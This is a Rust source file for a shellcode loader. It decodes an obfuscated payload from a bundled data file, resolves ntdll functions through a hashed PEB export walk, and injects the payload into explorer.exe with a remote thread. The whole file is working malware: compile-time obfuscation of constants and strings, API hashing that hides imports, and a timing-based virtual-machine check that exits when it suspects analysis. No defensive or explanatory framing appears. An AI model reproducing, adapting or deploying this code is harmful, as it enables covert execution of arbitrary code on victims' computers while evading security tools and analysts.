use goldberg::*;
use std::mem::transmute;
use std::ptr::null_mut;
use winapi::shared::basetsd::SIZE_T;
use winapi::shared::minwindef::{DWORD, ULONG};
use winapi::shared::ntdef::NTSTATUS;
use winapi::um::handleapi::{CloseHandle, INVALID_HANDLE_VALUE};
use winapi::um::processthreadsapi::OpenProcess;
use std::{arch::asm, io::{self, Write}};
use winapi::um::tlhelp32::{
    CreateToolhelp32Snapshot, Process32First, Process32Next, PROCESSENTRY32, TH32CS_SNAPPROCESS,
};
use winapi::um::winnt::{IMAGE_DOS_HEADER, IMAGE_EXPORT_DIRECTORY, IMAGE_NT_HEADERS};
use winapi::ctypes::c_void;

const SHELLCODE_DATA: &str = include_str!("load.dat");
const CHARSET: &str = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
const ACCESS_ALL: DWORD = goldberg_int!(0x1F0FFF);
const MEMORY_COMMIT: u32 = goldberg_int!(0x1000);
const MEMORY_RESERVE: u32 = goldberg_int!(0x2000);
const PAGE_RW: u32 = goldberg_int!(0x04);
const PAGE_EXEC_RW: u32 = goldberg_int!(0x40);

type AllocMemFn = unsafe extern "system" fn(
    process_handle: *mut c_void,
    base_address: *mut *mut c_void,
    zero_bits: ULONG,
    region_size: *mut SIZE_T,
    allocation_type: u32,
    protect: u32,
) -> NTSTATUS;

type WriteMemFn = unsafe extern "system" fn(
    process_handle: *mut c_void,
    base_address: *mut c_void,
    buffer: *const c_void,
    buffer_size: usize,
    bytes_written: *mut usize,
) -> NTSTATUS;

type ProtectMemFn = unsafe extern "system" fn(
    process_handle: *mut c_void,
    base_address: *mut *mut c_void,
    region_size: *mut usize,
    new_protect: u32,
    old_protect: *mut u32,
) -> NTSTATUS;

type CreateThreadFn = unsafe extern "system" fn(
    process_handle: *mut c_void,
    security_descriptor: *mut c_void,
    create_suspended: bool,
    stack_zero_bits: u32,
    stack_reserved: SIZE_T,
    stack_commit: SIZE_T,
    start_address: *mut c_void,
    start_parameter: *mut c_void,
    thread_handle: *mut *mut c_void,
    client_id: *mut c_void,
) -> NTSTATUS;

#[repr(C)]
#[derive(Copy, Clone)]
struct EntryNode {
    next: *mut EntryNode,
    prev: *mut EntryNode,
}

#[repr(C)]
#[derive(Copy, Clone)]
struct WideStr {
    len: u16,
    max_len: u16,
    ptr: *mut u16,
}

struct NtFunctions {
    alloc_memory: AllocMemFn,
    write_memory: WriteMemFn,
    protect_memory: ProtectMemFn,
    create_thread: CreateThreadFn,
}

impl NtFunctions {
    fn resolve_funcs(lib_checksum: u32, func_checks: Vec<(u32, String)>) -> Option<Self> {
        let mut resolved = std::collections::HashMap::new();
        for (checksum, name) in func_checks {
            let ptr = locate_routine(lib_checksum, checksum);
            if ptr.is_null() {
                return None;
            }
            resolved.insert(name, ptr);
        }
        Some(NtFunctions {
            alloc_memory: unsafe { transmute(resolved["NtAllocateVirtualMemory"]) },
            write_memory: unsafe { transmute(resolved["NtWriteVirtualMemory"]) },
            protect_memory: unsafe { transmute(resolved["NtProtectVirtualMemory"]) },
            create_thread: unsafe { transmute(resolved["RtlCreateUserThread"]) },
        })
    }
}

fn compute_checksum(data: &[u8]) -> u32 {
    let mut total = goldberg_int!(0x811c9dc5u32);
    for &byte in data {
        let upper = byte.to_ascii_uppercase();
        total ^= upper as u32;
        total = total.wrapping_mul(goldberg_int!(0x01000193u32));
    }
    total
}

fn compute_wide_checksum(wide_str: &[u16]) -> u32 {
    let mut total = goldberg_int!(0x811c9dc5u32);
    for &char_code in wide_str {
        let high = ((char_code >> 8) & 0xFF) as u8;
        let low = (char_code & 0xFF) as u8;
        let upper_high = high.to_ascii_uppercase();
        let upper_low = low.to_ascii_uppercase();
        total ^= upper_high as u32;
        total = total.wrapping_mul(goldberg_int!(0x01000193u32));
        total ^= upper_low as u32;
        total = total.wrapping_mul(goldberg_int!(0x01000193u32));
    }
    total
}

fn fetch_env_block() -> *mut c_void {
    unsafe {
        let env: *mut c_void;
        #[cfg(target_arch = "x86_64")]
        {
            asm!(
                "mov {}, gs:[0x60]",
                out(reg) env,
            );
        }
        #[cfg(target_arch = "x86")]
        {
            asm!(
                "mov {}, fs:[0x30]",
                out(reg) env,
            );
        }
        env
    }
}

fn locate_routine(lib_checksum: u32, target_checksum: u32) -> *mut c_void {
    unsafe {
        let env = fetch_env_block();
        let loader_offset = goldberg_int!(0x18u32) as usize;
        let loader_ptr = (env as *const u8).add(loader_offset) as *const *mut c_void;
        let loader = *loader_ptr;
        if loader.is_null() {
            return null_mut();
        }
        let mods_offset = goldberg_int!(0x20u32) as usize;
        let mods = (loader as *const u8).add(mods_offset) as *mut EntryNode;
        if mods.is_null() {
            return null_mut();
        }
        let first = (*mods).next;
        let mut current = first;
        loop {
            if current.is_null() {
                break;
            }
            let entry_ptr = (current as usize - goldberg_int!(0x10u32) as usize) as *const u8;
            let dll_base_offset = goldberg_int!(0x30u32) as usize;
            let dll_base_ptr = (entry_ptr).add(dll_base_offset) as *const *mut c_void;
            let dll_base = *dll_base_ptr;
            if dll_base.is_null() {
                current = (*current).next;
                if current == first {
                    break;
                }
                continue;
            }
            let fullname_offset = goldberg_int!(0x58u32) as usize;
            let fullname_ptr = (entry_ptr).add(fullname_offset) as *const WideStr;
            let fullname = *fullname_ptr;
            if fullname.ptr.is_null() {
                current = (*current).next;
                if current == first {
                    break;
                }
                continue;
            }
            let name_slice = std::slice::from_raw_parts(
                fullname.ptr,
                (fullname.len / 2) as usize,
            );
            let mod_sum = compute_wide_checksum(name_slice);
            if mod_sum == lib_checksum {
                let dos = dll_base as *const IMAGE_DOS_HEADER;
                if (*dos).e_magic != goldberg_int!(0x5A4Du16) {
                    current = (*current).next;
                    if current == first {
                        break;
                    }
                    continue;
                }
                let nt = (dll_base as usize + (*dos).e_lfanew as usize) as *const IMAGE_NT_HEADERS;
                if (*nt).Signature != goldberg_int!(0x00004550u32) {
                    current = (*current).next;
                    if current == first {
                        break;
                    }
                    continue;
                }
                let exports_dir = (*nt).OptionalHeader.DataDirectory[0].VirtualAddress as usize;
                if exports_dir == goldberg_int!(0u32) as usize {
                    current = (*current).next;
                    if current == first {
                        break;
                    }
                    continue;
                }
                let exports = (dll_base as usize + exports_dir) as *const IMAGE_EXPORT_DIRECTORY;
                let num_names = (*exports).NumberOfNames;
                let func_addresses = (dll_base as usize + (*exports).AddressOfFunctions as usize) as *const u32;
                let name_addresses = (dll_base as usize + (*exports).AddressOfNames as usize) as *const u32;
                let ordinals = (dll_base as usize + (*exports).AddressOfNameOrdinals as usize) as *const u16;
                for i in 0..num_names {
                    let name_rva = *name_addresses.add(i as usize);
                    let func_name_ptr = (dll_base as usize + name_rva as usize) as *const u8;
                    let mut len = 0;
                    while *func_name_ptr.add(len) != goldberg_int!(0u8) {
                        len += 1;
                    }
                    let name_bytes = std::slice::from_raw_parts(func_name_ptr, len as usize);
                    let func_sum = compute_checksum(name_bytes);
                    if func_sum == target_checksum {
                        let ord = *ordinals.add(i as usize);
                        let rva = *func_addresses.add(ord as usize);
                        let func_ptr = (dll_base as usize + rva as usize) as *mut c_void;
                        return func_ptr;
                    }
                }
            }
            current = (*current).next;
            if current == first {
                break;
            }
        }
        null_mut()
    }
}

fn decode_code(encoded: &str, seed: u8) -> Vec<u8> {
    let mut decoded = Vec::new();
    let mut feedback = seed;
    for chunk in encoded.as_bytes().chunks(2) {
        if let (Some(&high_char), Some(&low_char)) = (chunk.get(0), chunk.get(1)) {
            if let (Some(high_val), Some(low_val)) = (
                CHARSET.find(high_char as char),
                CHARSET.find(low_char as char),
            ) {
                let obf_byte = (high_val as u8) << 4 | (low_val as u8);
                let byte = ((obf_byte.rotate_left(3) ^ feedback) & 0xFF) as u8;
                decoded.push(byte);
                feedback = (feedback + byte) & 0xFF;
            } else {
                continue;
            }
        }
    }
    decoded
}

fn load_decode_code() -> Vec<u8> {
    decode_code(SHELLCODE_DATA, goldberg_int!(0xA5u8))
}

fn find_process_id(target_name: &str) -> Option<DWORD> {
    unsafe {
        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if snapshot == INVALID_HANDLE_VALUE {
            return None;
        }
        let mut entry: PROCESSENTRY32 = std::mem::zeroed();
        entry.dwSize = std::mem::size_of::<PROCESSENTRY32>() as u32;
        if Process32First(snapshot, &mut entry) == 0 {
            CloseHandle(snapshot);
            return None;
        }
        loop {
            let exe_name = match std::ffi::CStr::from_ptr(entry.szExeFile.as_ptr()).to_str() {
                Ok(s) => s,
                Err(_) => "<invalid utf8>",
            };
            if exe_name == target_name {
                CloseHandle(snapshot);
                return Some(entry.th32ProcessID);
            }
            if Process32Next(snapshot, &mut entry) == 0 {
                break;
            }
        }
        CloseHandle(snapshot);
        return None;
    }
}

fn execute_injection() -> Result<(), ()> {

    let alloc_mem_name = "NtAllocateVirtualMemory".to_string();
    let write_mem_name = "NtWriteVirtualMemory".to_string();
    let protect_mem_name = "NtProtectVirtualMemory".to_string();
    let create_thread_name = "RtlCreateUserThread".to_string();

    let lib_name = "ntdll.dll";
    let lib_wide = lib_name.encode_utf16().collect::<Vec<u16>>();
    let lib_sum = compute_wide_checksum(&lib_wide);

    let func_checksums = vec![
        (compute_checksum(alloc_mem_name.as_bytes()), alloc_mem_name.clone()),
        (compute_checksum(write_mem_name.as_bytes()), write_mem_name.clone()),
        (compute_checksum(protect_mem_name.as_bytes()), protect_mem_name.clone()),
        (compute_checksum(create_thread_name.as_bytes()), create_thread_name.clone()),
    ];

    let nt_funcs = NtFunctions::resolve_funcs(lib_sum, func_checksums).ok_or(())?;

    let shellcode = load_decode_code();
    let shell_len = shellcode.len();

    let target_process = "explorer.exe";
    let pid = find_process_id(target_process).ok_or(())?;

    let proc_handle = unsafe { OpenProcess(ACCESS_ALL, 0, pid) };
    if proc_handle.is_null() {
        return Err(());
    }

    let mut addr: *mut c_void = null_mut();
    let mut size = shell_len;
    let alloc_status = unsafe {
        (nt_funcs.alloc_memory)(
            proc_handle,
            &mut addr,
            0,
            &mut size,
            MEMORY_COMMIT | MEMORY_RESERVE,
            PAGE_RW,
        )
    };
    if alloc_status != 0 {
        unsafe { CloseHandle(proc_handle) };
        return Err(());
    }

    let mut written: usize = 0;
    let write_status = unsafe {
        (nt_funcs.write_memory)(
            proc_handle,
            addr,
            shellcode.as_ptr() as *const c_void,
            shell_len,
            &mut written,
        )
    };
    if write_status != 0 || written != shell_len {
        unsafe { CloseHandle(proc_handle) };
        return Err(());
    }

    let mut old_protect: u32 = 0;
    let mut region_size = shell_len;
    let protect_status = unsafe {
        (nt_funcs.protect_memory)(
            proc_handle,
            &mut addr,
            &mut region_size,
            PAGE_EXEC_RW,
            &mut old_protect,
        )
    };
    if protect_status != 0 {
        unsafe { CloseHandle(proc_handle) };
        return Err(());
    }

    let mut remote_thread: *mut c_void = null_mut();
    let thread_status = unsafe {
        (nt_funcs.create_thread)(
            proc_handle,
            null_mut(),
            false,
            0,
            0,
            0,
            addr,
            null_mut(),
            &mut remote_thread,
            null_mut(),
        )
    };
    if thread_status != 0 {
        unsafe { CloseHandle(proc_handle) };
        return Err(());
    }

    std::thread::sleep(std::time::Duration::from_secs(2));
    let reset_status = unsafe {
        (nt_funcs.protect_memory)(
            proc_handle,
            &mut addr,
            &mut region_size,
            PAGE_RW,
            &mut old_protect,
        )
    };
    if reset_status != 0 {
        unsafe {
            CloseHandle(remote_thread);
            CloseHandle(proc_handle);
        }
        return Err(());
    }

    unsafe {
        CloseHandle(remote_thread);
        CloseHandle(proc_handle);
    }

    Ok(())
}

fn check_vm() -> Result<(), ()> {
    let mut vm_score = 0;
    for _ in 0..3 {
        let mut scores = [0; 4];
        for thread_id in 0..4 {
            let mut results = Vec::new();
            for _ in 0..10 {
                let (start, end) = unsafe {
                    let (t_start, t_end): (u64, u64);
                    asm!("mfence", "rdtsc", "shl rdx, 32", "or rax, rdx", out("rax") t_start, out("rdx") _);
                    let measurement = match thread_id {
                        0 => {
                            let mut x = 1u64;
                            for _ in 0..100 {
                                x = x.wrapping_mul(7).wrapping_add(1);
                                std::hint::black_box(x);
                            }
                            x
                        },
                        1 => {
                            let mut y = 1.0f64;
                            for _ in 0..50 {
                                y = y.sin().cos().sqrt().exp();
                                std::hint::black_box(y);
                            }
                            y.to_bits()
                        },
                        2 => {
                            let mut sum = 0u64;
                            for i in 0..100 {
                                sum = if i % 2 == 0 {
                                    sum.wrapping_add(i)
                                } else if i % 3 == 0 {
                                    sum.wrapping_mul(2)
                                } else if i % 5 == 0 {
                                    sum.wrapping_sub(i)
                                } else {
                                    sum.wrapping_div(2)
                                };
                                std::hint::black_box(sum);
                            }
                            sum
                        },
                        _ => {
                            let data = vec![0u8; 4096];
                            let mut sum = 0u8;
                            for i in (0..data.len()).step_by(64) {
                                sum = sum.wrapping_add(data[i]);
                                std::hint::black_box(sum);
                            }
                            sum as u64
                        }
                    };
                    asm!("mfence", "rdtsc", "shl rdx, 32", "or rax, rdx", out("rax") t_end, out("rdx") _);
                    (t_start, t_end)
                };
                results.push(end.wrapping_sub(start));
            }
            let avg = results.iter().sum::<u64>() as f64 / results.len() as f64;
            let max = *results.iter().max().unwrap();
            let min = *results.iter().min().unwrap();
            let range = max - min;
            let variance = results.iter().map(|&x| {
                let diff = x as f64 - avg;
                diff * diff
            }).sum::<f64>() / results.len() as f64;
            let std_dev = variance.sqrt();
            let mut unique = results.clone();
            unique.sort_unstable();
            unique.dedup();
            let unique_count = unique.len();
            scores[thread_id] = if (avg < 20.0 && unique_count >= 5) ||
                                   (range == 0 && unique_count == 1) ||
                                   (std_dev > 5000.0 && range > 20000) ||
                                   (avg < 50.0 && unique_count > 4) ||
                                   (range == 0 && avg > 100.0) ||
                                   (std_dev > 6000.0 && range > 20000) ||
                                   (avg < 100.0 && std_dev < 10.0 && unique_count > 3) { 
                                       1 
                                   } else { 
                                       0 
                                   };
        }
        if scores.iter().sum::<i32>() >= 2 {
            vm_score += 1;
        }
    }
    if vm_score > 1 {
        std::process::exit(1);
    }
    Ok(())
}

fn main() {
    if let Ok(()) = check_vm() {
        goldberg_stmts!({
            if execute_injection().is_ok() {
                println!("{}", goldberg_string!("Success"));
            } else {
                println!("{}", goldberg_string!("Failure"));
            }
        });
    }
}